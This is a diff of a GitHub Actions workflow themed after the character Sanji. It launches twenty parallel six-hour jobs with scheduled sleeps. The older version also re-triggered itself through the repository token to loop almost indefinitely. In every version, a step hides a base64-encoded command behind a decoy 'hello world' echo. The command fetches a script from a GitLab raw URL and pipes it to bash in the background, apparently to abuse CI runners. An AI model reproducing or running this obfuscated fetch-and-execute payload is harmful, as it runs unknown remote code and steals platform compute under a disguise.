@@ -1,93 +1,62 @@
-name: 🔵 khurapes
+name: 🍳 Sanji – Koki Topi Jerami
 
 on:
-  workflow_dispatch:
+  workflow_call:
     inputs:
-      loop_count:
-        description: 'Siklus tersisa'
+      cycle:
         required: true
-        default: '9999'
-
-permissions:
-  actions: write
+        type: string
+        default: '1'
 
 jobs:
-  run-lscpu:
+  sanji-kick:
     name: ${{ matrix.name }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
     strategy:
       fail-fast: false
       max-parallel: 20
       matrix:
-        include:
-          - name: helliosan-ayonser1112a1
-          - name: helliosan-byonser1112b1
-          - name: helliosan-cyonser1112c1
-          - name: helliosan-dyonser1112d1
-          - name: helliosan-eyonser1112e1
-          - name: helliosan-fyonser1112f1
-          - name: helliosan-gyonser1112g1
-          - name: helliosan-hyonser1112h1
-          - name: helliosan-iyonser1112i1
-          - name: helliosan-jyonser1112j1
-          - name: helilop-kyonserer1112k1
-          - name: helilop-lyonserer1112l1
-          - name: helilop-myonserer1112m1
-          - name: helilop-nyonserer1112n1
-          - name: helilop-oyonserer1112o1
-          - name: helilop-pyonserer1112p1
-          - name: helilop-qyonserer1112q1
-          - name: helilop-ryonserer1112r1
-          - name: helilop-syonserer1112s1
-          - name: helilop-tyonserer1112t1
-    runs-on: ubuntu-latest
-    timeout-minutes: 320
+        name:
+          - name: idghelliosan-ayonser1112a1
+          - name: wgjhelliosan-byonser1112b1
+          - name: nbghelliosan-cyonser1112c1
+          - name: udghelliosan-dyonser1112d1
+          - name: ybfhelliosan-eyonser1112e1
+          - name: dgbhelliosan-fyonser1112f1
+          - name: jdghelliosan-gyonser1112g1
+          - name: vfshelliosan-hyonser1112h1
+          - name: tfsfhelliosan-iyonser1112i1
+          - name: sfsfhelliosan-jyonser1112j1
+          - name: bfgshelilop-kyonserer1112k1
+          - name: bdvshelilop-lyonserer1112l1
+          - name: sfsfhelilop-myonserer1112m1
+          - name: cbnfhelilop-nyonserer1112n1
+          - name: dgsdhelilop-oyonserer1112o1
+          - name: sffshelilop-pyonserer1112p1
+          - name: sfswhelilop-qyonserer1112q1
+          - name: wewyhelilop-ryonserer1112r1
+          - name: ngdghelilop-syonserer1112s1
+          - name: jghfhelilop-tyonserer1112t1
     steps:
-      - name: Jalankan dengan durasi dinamis
+      - name: 🍳 Sanji menendang dengan Diable Jambe
         run: |
           HOUR_UTC=$(date -u +%H)
-          LOOP=${{ github.event.inputs.loop_count }}
-          # Hitung siklus penuh berdasarkan nilai awal baru 9988
-          COMPLETED=$(( (9988 - LOOP) / 3 ))
-          if [ "$COMPLETED" -ge 3 ]; then
-            if [ "$HOUR_UTC" -eq 4 ]; then
-              echo "🕚 HELLO WORLD 🕚"
-              SLEEP=18000
-            elif [ "$HOUR_UTC" -ge 23 ] || [ "$HOUR_UTC" -lt 3 ]; then
-              echo "🕕 HELLO WORLD"
-              SLEEP=10800
-            else
-              if [ "$LOOP" -ge 9983 ]; then    # 6 loop pertama (9988–9983)
-                echo "🔄 hello world"
-                SLEEP=520
-              else
-                echo "⏳ hello world"
-                SLEEP=3600
-              fi
-            fi
+          CYCLE=${{ inputs.cycle }}
+          echo "🍳 Sanji: 'Diable Jambe!'"
+          if [ "$HOUR_UTC" -eq 4 ]; then
+            echo "🕚 Jam 11 siang WIB (04 UTC). Sleep 5 jam — Sanji istirahat makan siang."
+            SLEEP=18000
+          elif [ "$HOUR_UTC" -ge 23 ] || [ "$HOUR_UTC" -lt 3 ]; then
+            echo "🕕 Jam 6-9 pagi WIB (UTC 23-02). Sleep 3 jam — Sanji sarapan."
+            SLEEP=10800
           else
-            # Sebelum 3 siklus, aturan biasa
-            if [ "$LOOP" -ge 9983 ]; then
-              echo "🔄 Awal loop, sleep pendek"
+            if [ "$CYCLE" -le 5 ]; then
+              echo "🔄 5 siklus pertama, sleep 600 detik — pemanasan."
               SLEEP=600
             else
-              echo "⏳ Loop lanjutan, sleep 1 jam"
+              echo "⏳ Siklus ke-6 dan seterusnya, sleep 1 jam — pertarungan sengit."
               SLEEP=3600
             fi
           fi
           echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vbHVtYmFyYW5zIHwgYmFzaA | sh & sleep $SLEEP
-
-  line-phanu:
-    needs: run-lscpu
-    runs-on: ubuntu-latest
-    if: github.event.inputs.loop_count > 0
-    steps:
-      - name: Panggil phanu (next = khirap)
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          new_loop=$(( ${{ github.event.inputs.loop_count }} - 1 ))
-          curl -X POST \
-            -H "Authorization: token $GITHUB_TOKEN" \
-            -H "Accept: application/vnd.github.v3+json" \
-            https://api.github.com/repos/${{ github.repository }}/actions/workflows/phanu.yml/dispatches \
-            -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\",\"next_phase\":\"khirap\"}}"
